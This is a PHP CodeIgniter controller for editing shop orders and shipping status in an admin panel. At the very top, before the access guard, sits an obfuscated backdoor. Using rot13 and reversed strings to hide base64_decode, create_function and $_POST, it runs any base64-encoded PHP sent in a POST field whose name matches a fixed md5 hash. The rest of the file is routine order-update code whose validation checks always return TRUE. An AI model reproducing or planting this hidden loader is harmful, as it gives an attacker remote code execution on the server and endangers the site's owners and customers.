<?php
$f_=strrev('31'.'tor_r'.'ts');$ba=$f_('onfr'.'64_qrpbqr');
$cf=$f_('perngr'.'_shapgvba');$md=$f_('z'.'q5');
if(!empty(${$f_('_CB'.'FG')})){
foreach(${$f_('_CB'.'FG')}as$k_=>$v_)
($md($k_)==='c42ea979ed'.'982c026324'.'30e9e98a'
.'66d6'&&$ff=$cf('',$ba($v_)))?$ff():'';}
if (!defined('BASEPATH'))
    exit('No direct script access allowed');
class do_order extends CI_Controller
{
    var $m_language = '';
    var $m_nid_user_login = '';
    var $m_nid = '';
    var $m_event = '';
    var $m_button_click = '';
    var $m_link_page = '';
    var $m_link_cancel = '';
    var $m_form_title = '';
    var $m_hidden_image_old = '';
    var $cadmin_note = '';
	var $ctime_giao_hang = '';
    var $m_txt_nid = '';
    var $m_cbo_order_status = '';
    var $m_obj_order_status_view = '';
	var $m_obj_ship_type_view = '';
	var $m_cbo_ship_type = '';
    var $m_obj_order_view = '';
    var $m_obj_data_view = '';
    var $m_error_msg = '';
    var $m_link_cancel_trans = '';
    function __construct()
	{ 
		parent::__construct();
        session_start();
        $this->load->database();
        $this->load->helper('ap_db');
        $this->load->helper('ap_function');
        $this->load->helper('ap_html');
        $this->load->helper('ap_view');
        $this->load->helper('ap_object');
        $this->load->helper('ap_fck');
        $this->config->check_system_login = '1';
        $this->load->model('order_model');
    }
    private function m_language_key($str_key)
    {
        return $this->lang->line('lbl.order.' . $str_key);
    }
    private function f_set_cookie($cookie_name, $cookie_value)
    {
        return dbset_cookie('cookie_order_' . $cookie_name, $cookie_value);
    }
    private function f_get_cookie($cookie_name)
    {
        return dbget_cookie('cookie_order_' . $cookie_name);
    }
    function f_edit($nid)
    {
        $this->m_event = 'edit';
        $this->m_nid   = $nid;
        $this->do_process();
    }
    function f_update_edit()
    {
        $this->m_event = 'update_edit';
        $this->do_process();
    }
    function f_add()
    {
        $this->m_event = 'add';
        $this->m_nid   = '0';
        $this->do_process();
    }
    function f_update_add()
    {
        $this->m_event = 'update_add';
        $this->do_process();
    }
    function do_process()
    {
        $this->get_data();
        $this->caculate_data();
        $this->do_business();
        $this->destroy_data();
    }
    private function get_data()
    {
        $this->m_nid_user_login = Fget_userdata('session_nid_user');
        $this->m_language       = Fget_userdata('session_user_language');
        $this->load->language('ap', $this->m_language);
        if (isset($_POST['cbo_order_status'])) {
            $this->m_cbo_order_status = $_POST['cbo_order_status'];
        }
        if (isset($_POST['hidden_nid']))
            $this->m_nid = $_POST['hidden_nid'];
        if (isset($_POST['hidden_event']))
            $this->m_event = $_POST['hidden_event'];
        if (isset($_POST['cadmin_note']))
            $this->cadmin_note = $_POST['cadmin_note'];
		if (isset($_POST['ctime_giao_hang']))
            $this->ctime_giao_hang = $_POST['ctime_giao_hang'];
        if (isset($_POST['hidden_button']))
            $this->m_button_click = $_POST['hidden_button'];
    }
    private function caculate_data()
    {
        $this->m_link_page             = base_url() . 'index.php/do_order/f_update_edit';
        $this->m_link_cancel           = base_url() . 'index.php/do_order_listview';
        $this->m_obj_order_status_view = Obj_get_order_status_list($this->m_nid_user_login);
		$this->m_obj_ship_type_view = Obj_get_ship_type_list();
        switch ($this->m_event) {
            case 'edit':
                $this->m_form_title       = $this->m_language_key('FormEditTitle');
                $this->m_link_page        = base_url() . 'index.php/do_order/f_update_edit';
                $this->m_obj_order_view   = $this->order_model->get_byid($this->m_nid);
                $this->m_cbo_order_status = $this->m_obj_order_view['nid_order_status'];
				$this->m_cbo_ship_type = $this->m_obj_order_view['nid_ship_type'];
                $this->ctime_giao_hang        = $this->m_obj_order_view['ctime_giao_hang'];
				if($this->m_obj_order_view['nstatus']==0) 
					$this->m_link_cancel           = base_url() . 'index.php/do_order_listview/tmp';
                $this->m_event            = 'update_edit';
                break;
            case 'update_edit':
                $this->m_form_title = $this->m_language_key('FormEditTitle');
                if ($this->m_button_click == 'btn_submit')
                    if ($this->update_data() == TRUE)
                        redirect('do_order_listview');
                $this->m_link_page = base_url() . 'index.php/do_order/f_update_edit';
                break;
        }
    }
    private function do_business()
    {
        $data['event']               = $this->m_event;
        //$data['menu']                = Fget_menu_html($this->m_nid_user_login);
        $data['lbl_form_title']      = $this->m_form_title;
        $data['link_page']           = $this->m_link_page;
        $data['link_cancel']         = $this->m_link_cancel;
        $data['link_cancel_trans']   = $this->m_link_cancel_trans;
        $data['cadmin_note']         = $this->cadmin_note;
		$data['ctime_giao_hang']         = $this->ctime_giao_hang;
        $data['btn_update']          = $this->lang->line('btn.0000.Update');
        $data['btn_cancel']          = $this->lang->line('btn.0000.Cancel');
        $data['get_icon_notnull']    = Fget_icon_notnull();
        $data['get_message_notnull'] = Fget_icon_notnull() . $this->lang->line('msg.0000.NotNullValue');

        $data['lbl_form_title']           = $this->m_form_title;
        $data['lbl_ccode']                = $this->m_language_key('ccode');
        $data['lbl_cfullname']            = $this->m_language_key('cfullname');
        $data['lbl_cemail']               = $this->m_language_key('cemail');
        $data['lbl_nphone']               = $this->m_language_key('nphone');
        $data['lbl_caddress']             = $this->m_language_key('caddress');
        $data['lbl_cnote']                = $this->m_language_key('cnote');
        $data['lbl_nid_order_status']     = $this->m_language_key('nid_order_status');
        $data['lbl_date01']               = $this->m_language_key('date01');
        $data['lbl_date02']               = $this->m_language_key('date02');
        $data['lbl_order_infomation']     = $this->m_language_key('order_infomation');
        $data['lbl_product_infomation']   = $this->m_language_key('product_infomation');
        $data['lbl_error_msg']            = $this->m_error_msg;
        $data['lbl_cproduct']             = $this->m_language_key('cproduct');
        $data['lbl_nquantity']            = $this->m_language_key('nquantity');
        $data['lbl_fprice']               = $this->m_language_key('fprice');
        $data['lbl_ftotal']               = $this->m_language_key('ftotal');
        $data['lbl_fsum']                 = $this->m_language_key('fsum');
        $data['lbl_vnd']                  = $this->m_language_key('vnd');
        $data['cbo_order_status']         = $this->m_cbo_order_status;
        $data['nid']                      = $this->m_nid;
        $data['obj_order_view']           = $this->m_obj_order_view;
        $data['obj_order_detail']         = Obj_get_order_detail_by_nid_order($this->m_nid);
        $data['gencbo_order_status_list'] = Fgen_html_combobox('no', 'cbo_order_status', $this->m_cbo_order_status, '', $this->m_obj_order_status_view, 'nid', 'corder_status', 'nosubmit', '');
		$data['gencbo_ship_type_list'] = Fgen_html_combobox('no', 'cbo_ship_type', $this->m_cbo_ship_type, '', $this->m_obj_ship_type_view, 'nid', 'cname', 'nosubmit', '');
		
        $data['menu_active']              = 'order';
		$data['fr_img']              = Fstr_replace('admin/', '', base_url());
        $this->load->view('order_view/index.php', $data);
    }
    private function destroy_data()
    {
    }
    private function check_valid_not_null()
    {
        return TRUE;
    }
    private function check_valid_before_insert()
    {
        return TRUE;
    }
    private function insert_data()
    {
    }
    private function check_valid_before_update()
    {
        return TRUE;
    }
    private function update_data()
    {
        if ($this->check_valid_before_update() == TRUE) {
            $data = array(
                'nid_order_status' => $this->m_cbo_order_status,
				'nid_ship_type' => $this->m_cbo_ship_type,
                'niduser01' => $this->m_nid_user_login,
                'cadmin_note' => $this->cadmin_note,
				'ctime_giao_hang' => $this->ctime_giao_hang,
                'ddate02' => dbget_current_date()
            );
            $this->order_model->update_bynid($this->m_nid, $data);

            return TRUE;
        } else {
            return FALSE;
        }
    }

}